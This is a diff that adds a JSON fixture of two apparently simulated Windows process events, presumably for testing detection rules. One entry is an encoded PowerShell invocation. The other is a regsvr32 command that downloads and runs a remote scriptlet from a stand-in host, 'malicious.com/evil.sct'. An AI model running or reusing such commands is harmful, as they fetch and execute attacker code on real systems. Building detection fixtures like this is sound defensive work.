@@ -1,0 +1,12 @@
+[
+  {
+    "TimeCreated": "2025-07-08T10:25:14Z",
+    "Process": "powershell.exe",
+    "CommandLine": "powershell -enc SQBFAFgAUwBQAE8AUwBFAEQ="
+  },
+  {
+    "TimeCreated": "2025-07-08T10:26:10Z",
+    "Process": "regsvr32.exe",
+    "CommandLine": "regsvr32 /s /n /u /i:http://malicious.com/evil.sct scrobj.dll"
+  }
+]
